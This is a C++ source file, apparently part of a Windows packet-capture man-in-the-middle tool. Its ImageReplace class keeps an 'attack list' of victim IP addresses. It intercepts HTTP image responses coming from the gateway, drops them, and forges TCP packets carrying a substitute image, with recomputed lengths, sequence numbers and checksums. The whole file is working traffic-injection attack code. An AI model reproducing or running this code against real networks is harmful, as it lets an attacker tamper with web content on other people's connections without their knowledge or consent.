#include "stdafx.h"
#include "ImageReplace.h"
#include "Packet.h"
#include <pcap.h>
#include "Helper.h"
#include "ThreadPool.h"
#include "NetManager.h"
#include <string>


bool ImageReplace::OnTargetPacket(const pcap_pkthdr* header, const BYTE* pkt_data)
{
	// check if is replacing
	const IPPacket* pIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
	if (pIp->protocol == PROTOCOL_TCP)
	{
		const TCPPacket* pTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + pIp->headerLen * 4];
		Config& target = m_attackList[pIp->sourceIp];
		if (target.sendImageInfo.find(pTcp->sourcePort) != target.sendImageInfo.end())
			return false;
	}
	return true;
}

bool ImageReplace::OnGatewayPacket(const pcap_pkthdr* header, const BYTE* pkt_data)
{
	const IPPacket* pIp = (const IPPacket*)&pkt_data[ETH_LENGTH];
	// not TCP
	if (pIp->protocol != PROTOCOL_TCP)
		return true;
	DWORD ipLength = pIp->headerLen * 4;
	const TCPPacket* pTcp = (const TCPPacket*)&pkt_data[ETH_LENGTH + ipLength];
	Config& target = m_attackList[pIp->destinationIp];

	// is replacing
	if (target.sendImageInfo.find(pTcp->destinationPort) != target.sendImageInfo.end())
		return false;

	// then check if we should replace

	DWORD tcpLength = pTcp->headerLen * 4;
	// not HTTP
	if (strncmp((LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength], "HTTP/1.", strlen("HTTP/1.")) != 0)
		return true;

	LPCSTR http = (LPCSTR)&pkt_data[ETH_LENGTH + ipLength + tcpLength];
	LPCSTR contentType = strstr(http, "Content-Type: image/");
	// not image
	if (contentType == nullptr)
		return true;


	// replace image
	// no replacing
	if (!target.replaceImages || target.imageData == nullptr)
		return true;
	target.replace++;
	auto& sendInfo = target.sendImageInfo[pTcp->destinationPort];
	sendInfo.sourcePort = pTcp->sourcePort;
	sendInfo.initPacketLen = header->len;
	sendInfo.initPacket.reset(new BYTE[header->len]);
	memcpy(sendInfo.initPacket.get(), pkt_data, header->len);
	g_threadPool.AddTask(std::bind(&ImageReplace::SendImageThread, this, pIp->destinationIp, pTcp->destinationPort));
	return false;
}

ImageReplace::Config& ImageReplace::GetConfig(IpAddress ip)
{
	return m_attackList[ip];
}

void ImageReplace::SetConfig(IpAddress ip, bool replaceImages, const CString& imagePath)
{
	Config& config = GetConfig(ip);
	config.replaceImages = replaceImages;

	if (config.imagePath != imagePath) // read image
	{
		config.imagePath = imagePath;
		
		CFile f;
		{ std::lock_guard<std::mutex> lock(config.imageDataLock);
			if (f.Open(imagePath, CFile::modeRead | CFile::typeBinary))
			{
				config.imageDataLen = (DWORD)f.GetLength();
				config.imageData.reset(new BYTE[config.imageDataLen]);
				f.Read(config.imageData.get(), config.imageDataLen);
			}
			else
			{
				config.imageDataLen = 0;
				config.imageData.reset();
				AfxMessageBox("Failed to load the image.", MB_ICONERROR);
			}
		}
	}
}

void ImageReplace::SendImageThread(IpAddress targetIp, WORD targetPort)
{
	AdapterHandle adapter(GetAdapterHandle());
	if (adapter == nullptr)
		return;

	// get information
	MacAddress targetMac = g_netManager.m_host[targetIp];
	Config& target = m_attackList[targetIp];
	auto& info = target.sendImageInfo[targetPort];
	IPPacket* pInitIp = (IPPacket*)&info.initPacket[ETH_LENGTH];
	DWORD ipLen = pInitIp->headerLen * 4;
	TCPPacket* pInitTcp = (TCPPacket*)&info.initPacket[ETH_LENGTH + ipLen];
	DWORD tcpLen = pInitTcp->headerLen * 4;


	// send image
	DWORD sendBufLen = info.initPacketLen > 1000 ? info.initPacketLen : 1000;
	std::unique_ptr<BYTE[]> sendBuf(new BYTE[sendBufLen]);

#pragma region HTTP Header
	///////////////////////////////////////////////////////////////////////////////////
	// send HTTP header in the initial packet
	const char* pHttp = (const char*)&info.initPacket[ETH_LENGTH + ipLen + tcpLen];
	std::string httpHeader(pHttp, strstr(pHttp, "\r\n\r\n") + 2 - pHttp); // "...\r\n"
	int iContentLen = httpHeader.find("Content-Length: ");
	if (iContentLen == std::string::npos)
	{
		char sLength[20];
		sprintf_s(sLength, "%u\r\n\r\n", target.imageDataLen);
		httpHeader += sLength;
	}
	else
	{
		char sLength[20];
		_itoa_s(target.imageDataLen, sLength, 10);
		httpHeader.replace(iContentLen + 16, httpHeader.find('\r', iContentLen + 16), sLength);
		httpHeader += "\r\n";
	}

	*(MacAddress*)sendBuf.get() = targetMac;						// destination MAC
	*(MacAddress*)(sendBuf.get() + 6) = g_netManager.m_selfMac;		// source MAC

	// IP, TCP
	BYTE* p1 = sendBuf.get() + 12;
	DWORD len = 2 + ipLen + tcpLen;
	memcpy(p1, info.initPacket.get() + 12, len);
	p1 += len;

	// HTTP
	len = httpHeader.length();
	memcpy(p1, httpHeader.c_str(), len);
	p1 += len;

	DWORD totalLen = p1 - sendBuf.get();
	IPPacket* pIp = (IPPacket*)&sendBuf[ETH_LENGTH];
	pIp->totalLen = htons((u_short)(totalLen - ETH_LENGTH));		// IP total length
	pIp->CalcCheckSum();											// IP checksum
	TCPPacket* pTcp = (TCPPacket*)&sendBuf[ETH_LENGTH + ipLen];
	pTcp->psh = 0;
	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, p1 - (BYTE*)pTcp); // TCP checksum

	pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), totalLen);
	pTcp->seq = htonl(ntohl(pTcp->seq) + len);
	///////////////////////////////////////////////////////////////////////////////////
#pragma endregion

	///////////////////////////////////////////////////////////////////////////////////
	// send image
	BYTE* pTcpData = (BYTE*)pTcp + tcpLen;
	DWORD maxTcpDataLen = sendBuf.get() + sendBufLen - pTcpData;
	pIp->totalLen = htons((u_short)(sendBufLen - ETH_LENGTH));		// IP total length
	pIp->CalcCheckSum();											// IP checksum
	DWORD start;
	for (start = 0; start + maxTcpDataLen < target.imageDataLen - 1; start += maxTcpDataLen)
	{
		{ std::lock_guard<std::mutex> lock(target.imageDataLock);
			if (target.imageData == nullptr)
				goto End;
			memcpy(pTcpData, &target.imageData[start], maxTcpDataLen);
		}
		pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + maxTcpDataLen)); // TCP checksum
		pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), sendBufLen);
		pTcp->seq = htonl(ntohl(pTcp->seq) + maxTcpDataLen);
	}

	// last packet
	DWORD lastTcpDataLen = target.imageDataLen - start;
	{ std::lock_guard<std::mutex> lock(target.imageDataLock);
		if (target.imageData == nullptr)
			goto End;
		memcpy(pTcpData, &target.imageData[start], lastTcpDataLen);
	}
	pIp->totalLen = htons((u_short)(ipLen + tcpLen + lastTcpDataLen));				// IP total length
	pIp->CalcCheckSum();															// IP checksum
	pTcp->psh = 1;
	pTcp->fin = 1;
	pTcp->CalcCheckSum(pIp->sourceIp, pIp->destinationIp, (WORD)(tcpLen + lastTcpDataLen)); // TCP checksum
	pcap_sendpacket(adapter.get(), (u_char*)sendBuf.get(), ETH_LENGTH + ntohs(pIp->totalLen));
	///////////////////////////////////////////////////////////////////////////////////


	///////////////////////////////////////////////////////////////////////////////////
	// release
End:
	target.sendImageInfo.erase(targetPort);

	TRACE("send image (%s:%u) end\n", (CString)targetIp, targetPort);
}
